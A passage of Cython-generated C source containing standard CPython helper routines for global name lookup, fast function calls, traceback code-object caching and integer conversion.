    if (unlikely(!dict) || unlikely(tp_dict_version != __PYX_GET_DICT_VERSION(dict)))
        return 0;
    return obj_dict_version == __Pyx_get_object_dict_version(obj);
}
#endif

/* GetModuleGlobalName */
#if CYTHON_USE_DICT_VERSIONS
static PyObject *__Pyx__GetModuleGlobalName(PyObject *name, PY_UINT64_T *dict_version, PyObject **dict_cached_value)
#else
static CYTHON_INLINE PyObject *__Pyx__GetModuleGlobalName(PyObject *name)
#endif
{
    PyObject *result;
#if CYTHON_COMPILING_IN_LIMITED_API
    if (unlikely(!__pyx_m)) {
        if (!PyErr_Occurred())
            PyErr_SetNone(PyExc_NameError);
        return NULL;
    }
    result = PyObject_GetAttr(__pyx_m, name);
    if (likely(result)) {
        return result;
    }
    PyErr_Clear();
#elif CYTHON_AVOID_BORROWED_REFS || CYTHON_AVOID_THREAD_UNSAFE_BORROWED_REFS
    if (unlikely(__Pyx_PyDict_GetItemRef(__pyx_mstate_global->__pyx_d, name, &result) == -1)) PyErr_Clear();
    __PYX_UPDATE_DICT_CACHE(__pyx_mstate_global->__pyx_d, result, *dict_cached_value, *dict_version)
    if (likely(result)) {
        return result;
    }
#else
    result = _PyDict_GetItem_KnownHash(__pyx_mstate_global->__pyx_d, name, ((PyASCIIObject *) name)->hash);
    __PYX_UPDATE_DICT_CACHE(__pyx_mstate_global->__pyx_d, result, *dict_cached_value, *dict_version)
    if (likely(result)) {
        return __Pyx_NewRef(result);
    }
    PyErr_Clear();
#endif
    return __Pyx_GetBuiltinName(name);
}

/* PyFunctionFastCall */
#if CYTHON_FAST_PYCALL && !CYTHON_VECTORCALL
static PyObject* __Pyx_PyFunction_FastCallNoKw(PyCodeObject *co, PyObject *const *args, Py_ssize_t na,
                                               PyObject *globals) {
    PyFrameObject *f;
    PyThreadState *tstate = __Pyx_PyThreadState_Current;
    PyObject **fastlocals;
    Py_ssize_t i;
    PyObject *result;
    assert(globals != NULL);
    /* XXX Perhaps we should create a specialized
       PyFrame_New() that doesn't take locals, but does
       take builtins without sanity checking them.
       */
    assert(tstate != NULL);
    f = PyFrame_New(tstate, co, globals, NULL);
    if (f == NULL) {
        return NULL;
    }
    fastlocals = __Pyx_PyFrame_GetLocalsplus(f);
    for (i = 0; i < na; i++) {
        Py_INCREF(*args);
        fastlocals[i] = *args++;
    }
    result = PyEval_EvalFrameEx(f,0);
    ++tstate->recursion_depth;
    Py_DECREF(f);
    --tstate->recursion_depth;
    return result;
}
static PyObject *__Pyx_PyFunction_FastCallDict(PyObject *func, PyObject *const *args, Py_ssize_t nargs, PyObject *kwargs) {
    PyCodeObject *co = (PyCodeObject *)PyFunction_GET_CODE(func);
    PyObject *globals = PyFunction_GET_GLOBALS(func);
    PyObject *argdefs = PyFunction_GET_DEFAULTS(func);
    PyObject *closure;
    PyObject *kwdefs;
    PyObject *kwtuple, **k;
    PyObject **d;
    Py_ssize_t nd;
    Py_ssize_t nk;
    PyObject *result;
    assert(kwargs == NULL || PyDict_Check(kwargs));
    nk = kwargs ? PyDict_Size(kwargs) : 0;
    if (unlikely(Py_EnterRecursiveCall(" while calling a Python object"))) {
        return NULL;
    }
    if (
            co->co_kwonlyargcount == 0 &&
            likely(kwargs == NULL || nk == 0) &&
            co->co_flags == (CO_OPTIMIZED | CO_NEWLOCALS | CO_NOFREE)) {
        if (argdefs == NULL && co->co_argcount == nargs) {
            result = __Pyx_PyFunction_FastCallNoKw(co, args, nargs, globals);
            goto done;
        }
        else if (nargs == 0 && argdefs != NULL
                 && co->co_argcount == Py_SIZE(argdefs)) {
            /* function called with no arguments, but all parameters have
               a default value: use default values as arguments .*/
            args = &PyTuple_GET_ITEM(argdefs, 0);
            result =__Pyx_PyFunction_FastCallNoKw(co, args, Py_SIZE(argdefs), globals);
            goto done;
        }
    }
    if (kwargs != NULL) {
        Py_ssize_t pos, i;
        kwtuple = PyTuple_New(2 * nk);
        if (kwtuple == NULL) {
            result = NULL;
            goto done;
        }
        k = &PyTuple_GET_ITEM(kwtuple, 0);
        pos = i = 0;
        while (PyDict_Next(kwargs, &pos, &k[i], &k[i+1])) {
            Py_INCREF(k[i]);
            Py_INCREF(k[i+1]);
            i += 2;
        }
        nk = i / 2;
    }
    else {
        kwtuple = NULL;
        k = NULL;
    }
    closure = PyFunction_GET_CLOSURE(func);
    kwdefs = PyFunction_GET_KW_DEFAULTS(func);
    if (argdefs != NULL) {
        d = &PyTuple_GET_ITEM(argdefs, 0);
        nd = Py_SIZE(argdefs);
    }
    else {
        d = NULL;
        nd = 0;
    }
    result = PyEval_EvalCodeEx((PyObject*)co, globals, (PyObject *)NULL,
                               args, (int)nargs,
                               k, (int)nk,
                               d, (int)nd, kwdefs, closure);
    Py_XDECREF(kwtuple);
done:
    Py_LeaveRecursiveCall();
    return result;
}
#endif

/* PyObjectCall */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_Call(PyObject *func, PyObject *arg, PyObject *kw) {
    PyObject *result;
    ternaryfunc call = Py_TYPE(func)->tp_call;
    if (unlikely(!call))
        return PyObject_Call(func, arg, kw);
    if (unlikely(Py_EnterRecursiveCall(" while calling a Python object")))
        return NULL;
    result = (*call)(func, arg, kw);
    Py_LeaveRecursiveCall();
    if (unlikely(!result) && unlikely(!PyErr_Occurred())) {
        PyErr_SetString(
            PyExc_SystemError,
            "NULL result without error in PyObject_Call");
    }
    return result;
}
#endif

/* PyObjectCallMethO */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallMethO(PyObject *func, PyObject *arg) {
    PyObject *self, *result;
    PyCFunction cfunc;
    cfunc = __Pyx_CyOrPyCFunction_GET_FUNCTION(func);
    self = __Pyx_CyOrPyCFunction_GET_SELF(func);
    if (unlikely(Py_EnterRecursiveCall(" while calling a Python object")))
        return NULL;
    result = cfunc(self, arg);
    Py_LeaveRecursiveCall();
    if (unlikely(!result) && unlikely(!PyErr_Occurred())) {
        PyErr_SetString(
            PyExc_SystemError,
            "NULL result without error in PyObject_Call");
    }
    return result;
}
#endif

/* PyObjectFastCall */
#if PY_VERSION_HEX < 0x03090000 || CYTHON_COMPILING_IN_LIMITED_API
static PyObject* __Pyx_PyObject_FastCall_fallback(PyObject *func, PyObject * const*args, size_t nargs, PyObject *kwargs) {
    PyObject *argstuple;
    PyObject *result = 0;
    size_t i;
    argstuple = PyTuple_New((Py_ssize_t)nargs);
    if (unlikely(!argstuple)) return NULL;
    for (i = 0; i < nargs; i++) {
        Py_INCREF(args[i]);
        if (__Pyx_PyTuple_SET_ITEM(argstuple, (Py_ssize_t)i, args[i]) != (0)) goto bad;
    }
    result = __Pyx_PyObject_Call(func, argstuple, kwargs);
  bad:
    Py_DECREF(argstuple);
    return result;
}
#endif
#if CYTHON_VECTORCALL && !CYTHON_COMPILING_IN_LIMITED_API
  #if PY_VERSION_HEX < 0x03090000
    #define __Pyx_PyVectorcall_Function(callable) _PyVectorcall_Function(callable)
  #elif CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE vectorcallfunc __Pyx_PyVectorcall_Function(PyObject *callable) {
    PyTypeObject *tp = Py_TYPE(callable);
    #if defined(__Pyx_CyFunction_USED)
    if (__Pyx_CyFunction_CheckExact(callable)) {
        return __Pyx_CyFunction_func_vectorcall(callable);
    }
    #endif
    if (!PyType_HasFeature(tp, Py_TPFLAGS_HAVE_VECTORCALL)) {
        return NULL;
    }
    assert(PyCallable_Check(callable));
    Py_ssize_t offset = tp->tp_vectorcall_offset;
    assert(offset > 0);
    vectorcallfunc ptr;
    memcpy(&ptr, (char *) callable + offset, sizeof(ptr));
    return ptr;
}
  #else
    #define __Pyx_PyVectorcall_Function(callable) PyVectorcall_Function(callable)
  #endif
#endif
static CYTHON_INLINE PyObject* __Pyx_PyObject_FastCallDict(PyObject *func, PyObject *const *args, size_t _nargs, PyObject *kwargs) {
    Py_ssize_t nargs = __Pyx_PyVectorcall_NARGS(_nargs);
#if CYTHON_COMPILING_IN_CPYTHON
    if (nargs == 0 && kwargs == NULL) {
        if (__Pyx_CyOrPyCFunction_Check(func) && likely( __Pyx_CyOrPyCFunction_GET_FLAGS(func) & METH_NOARGS))
            return __Pyx_PyObject_CallMethO(func, NULL);
    }
    else if (nargs == 1 && kwargs == NULL) {
        if (__Pyx_CyOrPyCFunction_Check(func) && likely( __Pyx_CyOrPyCFunction_GET_FLAGS(func) & METH_O))
            return __Pyx_PyObject_CallMethO(func, args[0]);
    }
#endif
    #if PY_VERSION_HEX < 0x030800B1
    #if CYTHON_FAST_PYCCALL
    if (PyCFunction_Check(func)) {
        if (kwargs) {
            return _PyCFunction_FastCallDict(func, args, nargs, kwargs);
        } else {
            return _PyCFunction_FastCallKeywords(func, args, nargs, NULL);
        }
    }
    if (!kwargs && __Pyx_IS_TYPE(func, &PyMethodDescr_Type)) {
        return _PyMethodDescr_FastCallKeywords(func, args, nargs, NULL);
    }
    #endif
    #if CYTHON_FAST_PYCALL
    if (PyFunction_Check(func)) {
        return __Pyx_PyFunction_FastCallDict(func, args, nargs, kwargs);
    }
    #endif
    #endif
    if (kwargs == NULL) {
        #if CYTHON_VECTORCALL && !CYTHON_COMPILING_IN_LIMITED_API
        vectorcallfunc f = __Pyx_PyVectorcall_Function(func);
        if (f) {
            return f(func, args, _nargs, NULL);
        }
        #elif defined(__Pyx_CyFunction_USED) && CYTHON_BACKPORT_VECTORCALL
        if (__Pyx_CyFunction_CheckExact(func)) {
            __pyx_vectorcallfunc f = __Pyx_CyFunction_func_vectorcall(func);
            if (f) return f(func, args, _nargs, NULL);
        }
        #elif CYTHON_COMPILING_IN_LIMITED_API && CYTHON_VECTORCALL
        return PyObject_Vectorcall(func, args, _nargs, NULL);
        #endif
    }
    if (nargs == 0) {
        return __Pyx_PyObject_Call(func, __pyx_mstate_global->__pyx_empty_tuple, kwargs);
    }
    #if PY_VERSION_HEX >= 0x03090000 && !CYTHON_COMPILING_IN_LIMITED_API
    return PyObject_VectorcallDict(func, args, (size_t)nargs, kwargs);
    #else
    return __Pyx_PyObject_FastCall_fallback(func, args, (size_t)nargs, kwargs);
    #endif
}

/* CLineInTraceback */
#if CYTHON_CLINE_IN_TRACEBACK && CYTHON_CLINE_IN_TRACEBACK_RUNTIME
static int __Pyx_CLineForTraceback(PyThreadState *tstate, int c_line) {
    PyObject *use_cline;
    PyObject *ptype, *pvalue, *ptraceback;
#if CYTHON_COMPILING_IN_CPYTHON
    PyObject **cython_runtime_dict;
#endif
    CYTHON_MAYBE_UNUSED_VAR(tstate);
    if (unlikely(!__pyx_mstate_global->__pyx_cython_runtime)) {
        return c_line;
    }
    __Pyx_ErrFetchInState(tstate, &ptype, &pvalue, &ptraceback);
#if CYTHON_COMPILING_IN_CPYTHON
    cython_runtime_dict = _PyObject_GetDictPtr(__pyx_mstate_global->__pyx_cython_runtime);
    if (likely(cython_runtime_dict)) {
        __Pyx_BEGIN_CRITICAL_SECTION(*cython_runtime_dict);
        __PYX_PY_DICT_LOOKUP_IF_MODIFIED(
            use_cline, *cython_runtime_dict,
            __Pyx_PyDict_GetItemStr(*cython_runtime_dict, __pyx_mstate_global->__pyx_n_u_cline_in_traceback))
        Py_XINCREF(use_cline);
        __Pyx_END_CRITICAL_SECTION();
    } else
#endif
    {
      PyObject *use_cline_obj = __Pyx_PyObject_GetAttrStrNoError(__pyx_mstate_global->__pyx_cython_runtime, __pyx_mstate_global->__pyx_n_u_cline_in_traceback);
      if (use_cline_obj) {
        use_cline = PyObject_Not(use_cline_obj) ? Py_False : Py_True;
        Py_INCREF(use_cline);
        Py_DECREF(use_cline_obj);
      } else {
        PyErr_Clear();
        use_cline = NULL;
      }
    }
    if (!use_cline) {
        c_line = 0;
        (void) PyObject_SetAttr(__pyx_mstate_global->__pyx_cython_runtime, __pyx_mstate_global->__pyx_n_u_cline_in_traceback, Py_False);
    }
    else if (use_cline == Py_False || (use_cline != Py_True && PyObject_Not(use_cline) != 0)) {
        c_line = 0;
    }
    Py_XDECREF(use_cline);
    __Pyx_ErrRestoreInState(tstate, ptype, pvalue, ptraceback);
    return c_line;
}
#endif

/* CodeObjectCache */
static int __pyx_bisect_code_objects(__Pyx_CodeObjectCacheEntry* entries, int count, int code_line) {
    int start = 0, mid = 0, end = count - 1;
    if (end >= 0 && code_line > entries[end].code_line) {
        return count;
    }
    while (start < end) {
        mid = start + (end - start) / 2;
        if (code_line < entries[mid].code_line) {
            end = mid;
        } else if (code_line > entries[mid].code_line) {
             start = mid + 1;
        } else {
            return mid;
        }
    }
    if (code_line <= entries[mid].code_line) {
        return mid;
    } else {
        return mid + 1;
    }
}
static __Pyx_CachedCodeObjectType *__pyx__find_code_object(struct __Pyx_CodeObjectCache *code_cache, int code_line) {
    __Pyx_CachedCodeObjectType* code_object;
    int pos;
    if (unlikely(!code_line) || unlikely(!code_cache->entries)) {
        return NULL;
    }
    pos = __pyx_bisect_code_objects(code_cache->entries, code_cache->count, code_line);
    if (unlikely(pos >= code_cache->count) || unlikely(code_cache->entries[pos].code_line != code_line)) {
        return NULL;
    }
    code_object = code_cache->entries[pos].code_object;
    Py_INCREF(code_object);
    return code_object;
}
static __Pyx_CachedCodeObjectType *__pyx_find_code_object(int code_line) {
#if CYTHON_COMPILING_IN_CPYTHON_FREETHREADING && !CYTHON_ATOMICS
    (void)__pyx__find_code_object;
    return NULL; // Most implementation should have atomics. But otherwise, don't make it thread-safe, just miss.
#else
    struct __Pyx_CodeObjectCache *code_cache = &__pyx_mstate_global->__pyx_code_cache;
#if CYTHON_COMPILING_IN_CPYTHON_FREETHREADING
    __pyx_nonatomic_int_type old_count = __pyx_atomic_incr_acq_rel(&code_cache->accessor_count);
    if (old_count < 0) {
        __pyx_atomic_decr_acq_rel(&code_cache->accessor_count);
        return NULL;
    }
#endif
    __Pyx_CachedCodeObjectType *result = __pyx__find_code_object(code_cache, code_line);
#if CYTHON_COMPILING_IN_CPYTHON_FREETHREADING
    __pyx_atomic_decr_acq_rel(&code_cache->accessor_count);
#endif
    return result;
#endif
}
static void __pyx__insert_code_object(struct __Pyx_CodeObjectCache *code_cache, int code_line, __Pyx_CachedCodeObjectType* code_object)
{
    int pos, i;
    __Pyx_CodeObjectCacheEntry* entries = code_cache->entries;
    if (unlikely(!code_line)) {
        return;
    }
    if (unlikely(!entries)) {
        entries = (__Pyx_CodeObjectCacheEntry*)PyMem_Malloc(64*sizeof(__Pyx_CodeObjectCacheEntry));
        if (likely(entries)) {
            code_cache->entries = entries;
            code_cache->max_count = 64;
            code_cache->count = 1;
            entries[0].code_line = code_line;
            entries[0].code_object = code_object;
            Py_INCREF(code_object);
        }
        return;
    }
    pos = __pyx_bisect_code_objects(code_cache->entries, code_cache->count, code_line);
    if ((pos < code_cache->count) && unlikely(code_cache->entries[pos].code_line == code_line)) {
        __Pyx_CachedCodeObjectType* tmp = entries[pos].code_object;
        entries[pos].code_object = code_object;
        Py_INCREF(code_object);
        Py_DECREF(tmp);
        return;
    }
    if (code_cache->count == code_cache->max_count) {
        int new_max = code_cache->max_count + 64;
        entries = (__Pyx_CodeObjectCacheEntry*)PyMem_Realloc(
            code_cache->entries, ((size_t)new_max) * sizeof(__Pyx_CodeObjectCacheEntry));
        if (unlikely(!entries)) {
            return;
        }
        code_cache->entries = entries;
        code_cache->max_count = new_max;
    }
    for (i=code_cache->count; i>pos; i--) {
        entries[i] = entries[i-1];
    }
    entries[pos].code_line = code_line;
    entries[pos].code_object = code_object;
    code_cache->count++;
    Py_INCREF(code_object);
}
static void __pyx_insert_code_object(int code_line, __Pyx_CachedCodeObjectType* code_object) {
#if CYTHON_COMPILING_IN_CPYTHON_FREETHREADING && !CYTHON_ATOMICS
    (void)__pyx__insert_code_object;
    return; // Most implementation should have atomics. But otherwise, don't make it thread-safe, just fail.
#else
    struct __Pyx_CodeObjectCache *code_cache = &__pyx_mstate_global->__pyx_code_cache;
#if CYTHON_COMPILING_IN_CPYTHON_FREETHREADING
    __pyx_nonatomic_int_type expected = 0;
    if (!__pyx_atomic_int_cmp_exchange(&code_cache->accessor_count, &expected, INT_MIN)) {
        return;
    }
#endif
    __pyx__insert_code_object(code_cache, code_line, code_object);
#if CYTHON_COMPILING_IN_CPYTHON_FREETHREADING
    __pyx_atomic_sub(&code_cache->accessor_count, INT_MIN);
#endif
#endif
}

/* AddTraceback */
#include "compile.h"
#include "frameobject.h"
#include "traceback.h"
#if PY_VERSION_HEX >= 0x030b00a6 && !CYTHON_COMPILING_IN_LIMITED_API && !defined(PYPY_VERSION)
  #ifndef Py_BUILD_CORE
    #define Py_BUILD_CORE 1
  #endif
  #include "internal/pycore_frame.h"
#endif
#if CYTHON_COMPILING_IN_LIMITED_API
static PyObject *__Pyx_PyCode_Replace_For_AddTraceback(PyObject *code, PyObject *scratch_dict,
                                                       PyObject *firstlineno, PyObject *name) {
    PyObject *replace = NULL;
    if (unlikely(PyDict_SetItemString(scratch_dict, "co_firstlineno", firstlineno))) return NULL;
    if (unlikely(PyDict_SetItemString(scratch_dict, "co_name", name))) return NULL;
    replace = PyObject_GetAttrString(code, "replace");
    if (likely(replace)) {
        PyObject *result = PyObject_Call(replace, __pyx_mstate_global->__pyx_empty_tuple, scratch_dict);
        Py_DECREF(replace);
        return result;
    }
    PyErr_Clear();
    return NULL;
}
static void __Pyx_AddTraceback(const char *funcname, int c_line,
                               int py_line, const char *filename) {
    PyObject *code_object = NULL, *py_py_line = NULL, *py_funcname = NULL, *dict = NULL;
    PyObject *replace = NULL, *getframe = NULL, *frame = NULL;
    PyObject *exc_type, *exc_value, *exc_traceback;
    int success = 0;
    if (c_line) {
        (void) __pyx_cfilenm;
        (void) __Pyx_CLineForTraceback(__Pyx_PyThreadState_Current, c_line);
    }
    PyErr_Fetch(&exc_type, &exc_value, &exc_traceback);
    code_object = __pyx_find_code_object(c_line ? -c_line : py_line);
    if (!code_object) {
        code_object = Py_CompileString("_getframe()", filename, Py_eval_input);
        if (unlikely(!code_object)) goto bad;
        py_py_line = PyLong_FromLong(py_line);
        if (unlikely(!py_py_line)) goto bad;
        py_funcname = PyUnicode_FromString(funcname);
        if (unlikely(!py_funcname)) goto bad;
        dict = PyDict_New();
        if (unlikely(!dict)) goto bad;
        {
            PyObject *old_code_object = code_object;
            code_object = __Pyx_PyCode_Replace_For_AddTraceback(code_object, dict, py_py_line, py_funcname);
            Py_DECREF(old_code_object);
        }
        if (unlikely(!code_object)) goto bad;
        __pyx_insert_code_object(c_line ? -c_line : py_line, code_object);
    } else {
        dict = PyDict_New();
    }
    getframe = PySys_GetObject("_getframe");
    if (unlikely(!getframe)) goto bad;
    if (unlikely(PyDict_SetItemString(dict, "_getframe", getframe))) goto bad;
    frame = PyEval_EvalCode(code_object, dict, dict);
    if (unlikely(!frame) || frame == Py_None) goto bad;
    success = 1;
  bad:
    PyErr_Restore(exc_type, exc_value, exc_traceback);
    Py_XDECREF(code_object);
    Py_XDECREF(py_py_line);
    Py_XDECREF(py_funcname);
    Py_XDECREF(dict);
    Py_XDECREF(replace);
    if (success) {
        PyTraceBack_Here(
            (struct _frame*)frame);
    }
    Py_XDECREF(frame);
}
#else
static PyCodeObject* __Pyx_CreateCodeObjectForTraceback(
            const char *funcname, int c_line,
            int py_line, const char *filename) {
    PyCodeObject *py_code = NULL;
    PyObject *py_funcname = NULL;
    if (c_line) {
        py_funcname = PyUnicode_FromFormat( "%s (%s:%d)", funcname, __pyx_cfilenm, c_line);
        if (!py_funcname) goto bad;
        funcname = PyUnicode_AsUTF8(py_funcname);
        if (!funcname) goto bad;
    }
    py_code = PyCode_NewEmpty(filename, funcname, py_line);
    Py_XDECREF(py_funcname);
    return py_code;
bad:
    Py_XDECREF(py_funcname);
    return NULL;
}
static void __Pyx_AddTraceback(const char *funcname, int c_line,
                               int py_line, const char *filename) {
    PyCodeObject *py_code = 0;
    PyFrameObject *py_frame = 0;
    PyThreadState *tstate = __Pyx_PyThreadState_Current;
    PyObject *ptype, *pvalue, *ptraceback;
    if (c_line) {
        c_line = __Pyx_CLineForTraceback(tstate, c_line);
    }
    py_code = __pyx_find_code_object(c_line ? -c_line : py_line);
    if (!py_code) {
        __Pyx_ErrFetchInState(tstate, &ptype, &pvalue, &ptraceback);
        py_code = __Pyx_CreateCodeObjectForTraceback(
            funcname, c_line, py_line, filename);
        if (!py_code) {
            /* If the code object creation fails, then we should clear the
               fetched exception references and propagate the new exception */
            Py_XDECREF(ptype);
            Py_XDECREF(pvalue);
            Py_XDECREF(ptraceback);
            goto bad;
        }
        __Pyx_ErrRestoreInState(tstate, ptype, pvalue, ptraceback);
        __pyx_insert_code_object(c_line ? -c_line : py_line, py_code);
    }
    py_frame = PyFrame_New(
        tstate,            /*PyThreadState *tstate,*/
        py_code,           /*PyCodeObject *code,*/
        __pyx_mstate_global->__pyx_d,    /*PyObject *globals,*/
        0                  /*PyObject *locals*/
    );
    if (!py_frame) goto bad;
    __Pyx_PyFrame_SetLineNumber(py_frame, py_line);
    PyTraceBack_Here(py_frame);
bad:
    Py_XDECREF(py_code);
    Py_XDECREF(py_frame);
}
#endif

/* FormatTypeName */
#if CYTHON_COMPILING_IN_LIMITED_API && __PYX_LIMITED_VERSION_HEX < 0x030d0000
static __Pyx_TypeName
__Pyx_PyType_GetFullyQualifiedName(PyTypeObject* tp)
{
    PyObject *module = NULL, *name = NULL, *result = NULL;
    #if __PYX_LIMITED_VERSION_HEX < 0x030b0000
    name = __Pyx_PyObject_GetAttrStr((PyObject *)tp,
                                               __pyx_mstate_global->__pyx_n_u_qualname);
    #else
    name = PyType_GetQualName(tp);
    #endif
    if (unlikely(name == NULL) || unlikely(!PyUnicode_Check(name))) goto bad;
    module = __Pyx_PyObject_GetAttrStr((PyObject *)tp,
                                               __pyx_mstate_global->__pyx_n_u_module);
    if (unlikely(module == NULL) || unlikely(!PyUnicode_Check(module))) goto bad;
    if (PyUnicode_CompareWithASCIIString(module, "builtins") == 0) {
        result = name;
        name = NULL;
        goto done;
    }
    result = PyUnicode_FromFormat("%U.%U", module, name);
    if (unlikely(result == NULL)) goto bad;
  done:
    Py_XDECREF(name);
    Py_XDECREF(module);
    return result;
  bad:
    PyErr_Clear();
    if (name) {
        result = name;
        name = NULL;
    } else {
        result = __Pyx_NewRef(__pyx_mstate_global->__pyx_kp_u_);
    }
    goto done;
}
#endif

/* PyObjectVectorCallKwBuilder */
#if CYTHON_VECTORCALL
static int __Pyx_VectorcallBuilder_AddArg(PyObject *key, PyObject *value, PyObject *builder, PyObject **args, int n) {
    (void)__Pyx_PyObject_FastCallDict;
    if (__Pyx_PyTuple_SET_ITEM(builder, n, key) != (0)) return -1;
    Py_INCREF(key);
    args[n] = value;
    return 0;
}
CYTHON_UNUSED static int __Pyx_VectorcallBuilder_AddArg_Check(PyObject *key, PyObject *value, PyObject *builder, PyObject **args, int n) {
    (void)__Pyx_VectorcallBuilder_AddArgStr;
    if (unlikely(!PyUnicode_Check(key))) {
        PyErr_SetString(PyExc_TypeError, "keywords must be strings");
        return -1;
    }
    return __Pyx_VectorcallBuilder_AddArg(key, value, builder, args, n);
}
static int __Pyx_VectorcallBuilder_AddArgStr(const char *key, PyObject *value, PyObject *builder, PyObject **args, int n) {
    PyObject *pyKey = PyUnicode_FromString(key);
    if (!pyKey) return -1;
    return __Pyx_VectorcallBuilder_AddArg(pyKey, value, builder, args, n);
}
#else // CYTHON_VECTORCALL
CYTHON_UNUSED static int __Pyx_VectorcallBuilder_AddArg_Check(PyObject *key, PyObject *value, PyObject *builder, CYTHON_UNUSED PyObject **args, CYTHON_UNUSED int n) {
    if (unlikely(!PyUnicode_Check(key))) {
        PyErr_SetString(PyExc_TypeError, "keywords must be strings");
        return -1;
    }
    return PyDict_SetItem(builder, key, value);
}
#endif

/* CIntToPy */
static CYTHON_INLINE PyObject* __Pyx_PyLong_From_long(long value) {
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wconversion"
#endif
    const long neg_one = (long) -1, const_zero = (long) 0;
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic pop
#endif
    const int is_unsigned = neg_one > const_zero;
    if (is_unsigned) {
        if (sizeof(long) < sizeof(long)) {
            return PyLong_FromLong((long) value);
        } else if (sizeof(long) <= sizeof(unsigned long)) {
            return PyLong_FromUnsignedLong((unsigned long) value);
#ifdef HAVE_LONG_LONG
        } else if (sizeof(long) <= sizeof(unsigned PY_LONG_LONG)) {
            return PyLong_FromUnsignedLongLong((unsigned PY_LONG_LONG) value);
#endif
        }
    } else {
        if (sizeof(long) <= sizeof(long)) {
            return PyLong_FromLong((long) value);
#ifdef HAVE_LONG_LONG
        } else if (sizeof(long) <= sizeof(PY_LONG_LONG)) {
            return PyLong_FromLongLong((PY_LONG_LONG) value);
#endif
        }
    }
    {
        unsigned char *bytes = (unsigned char *)&value;
#if !CYTHON_COMPILING_IN_LIMITED_API && PY_VERSION_HEX >= 0x030d00A4
        if (is_unsigned) {
            return PyLong_FromUnsignedNativeBytes(bytes, sizeof(value), -1);
        } else {
            return PyLong_FromNativeBytes(bytes, sizeof(value), -1);
        }
#elif !CYTHON_COMPILING_IN_LIMITED_API && PY_VERSION_HEX < 0x030d0000
        int one = 1; int little = (int)*(unsigned char *)&one;
        return _PyLong_FromByteArray(bytes, sizeof(long),
                                     little, !is_unsigned);
#else
        int one = 1; int little = (int)*(unsigned char *)&one;
        PyObject *from_bytes, *result = NULL, *kwds = NULL;
        PyObject *py_bytes = NULL, *order_str = NULL;
        from_bytes = PyObject_GetAttrString((PyObject*)&PyLong_Type, "from_bytes");
        if (!from_bytes) return NULL;
        py_bytes = PyBytes_FromStringAndSize((char*)bytes, sizeof(long));
        if (!py_bytes) goto limited_bad;
        order_str = PyUnicode_FromString(little ? "little" : "big");
        if (!order_str) goto limited_bad;
        {
            PyObject *args[3+(CYTHON_VECTORCALL ? 1 : 0)] = { NULL, py_bytes, order_str };
            if (!is_unsigned) {
                kwds = __Pyx_MakeVectorcallBuilderKwds(1);
                if (!kwds) goto limited_bad;
                if (__Pyx_VectorcallBuilder_AddArgStr("signed", __Pyx_NewRef(Py_True), kwds, args+3, 0) < 0) goto limited_bad;
            }
            result = __Pyx_Object_Vectorcall_CallFromBuilder(from_bytes, args+1, 2 | __Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET, kwds);
        }
        limited_bad:
        Py_XDECREF(kwds);
        Py_XDECREF(order_str);
        Py_XDECREF(py_bytes);
        Py_XDECREF(from_bytes);
        return result;
#endif
    }
}

/* CIntFromPyVerify */
#define __PYX_VERIFY_RETURN_INT(target_type, func_type, func_value)\
    __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, 0)
#define __PYX_VERIFY_RETURN_INT_EXC(target_type, func_type, func_value)\
    __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, 1)
#define __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, exc)\
    {\
        func_type value = func_value;\
        if (sizeof(target_type) < sizeof(func_type)) {\
            if (unlikely(value != (func_type) (target_type) value)) {\
                func_type zero = 0;\
                if (exc && unlikely(value == (func_type)-1 && PyErr_Occurred()))\
                    return (target_type) -1;\
                if (is_unsigned && unlikely(value < zero))\
                    goto raise_neg_overflow;\
                else\
                    goto raise_overflow;\
            }\
        }\
        return (target_type) value;\
    }

/* CIntFromPy */
static CYTHON_INLINE long __Pyx_PyLong_As_long(PyObject *x) {
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wconversion"
#endif
    const long neg_one = (long) -1, const_zero = (long) 0;
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic pop
#endif
    const int is_unsigned = neg_one > const_zero;
    if (unlikely(!PyLong_Check(x))) {
        long val;
        PyObject *tmp = __Pyx_PyNumber_Long(x);
        if (!tmp) return (long) -1;
        val = __Pyx_PyLong_As_long(tmp);
        Py_DECREF(tmp);
        return val;
    }
    if (is_unsigned) {
#if CYTHON_USE_PYLONG_INTERNALS
        if (unlikely(__Pyx_PyLong_IsNeg(x))) {
            goto raise_neg_overflow;
        } else if (__Pyx_PyLong_IsCompact(x)) {
            __PYX_VERIFY_RETURN_INT(long, __Pyx_compact_upylong, __Pyx_PyLong_CompactValueUnsigned(x))
        } else {
            const digit* digits = __Pyx_PyLong_Digits(x);
            assert(__Pyx_PyLong_DigitCount(x) > 1);
            switch (__Pyx_PyLong_DigitCount(x)) {
                case 2:
                    if ((8 * sizeof(long) > 1 * PyLong_SHIFT)) {
                        if ((8 * sizeof(unsigned long) > 2 * PyLong_SHIFT)) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if ((8 * sizeof(long) >= 2 * PyLong_SHIFT)) {
                            return (long) (((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));
                        }
                    }
                    break;
                case 3:
                    if ((8 * sizeof(long) > 2 * PyLong_SHIFT)) {
                        if ((8 * sizeof(unsigned long) > 3 * PyLong_SHIFT)) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if ((8 * sizeof(long) >= 3 * PyLong_SHIFT)) {
                            return (long) (((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));
                        }
                    }
                    break;
                case 4:
                    if ((8 * sizeof(long) > 3 * PyLong_SHIFT)) {
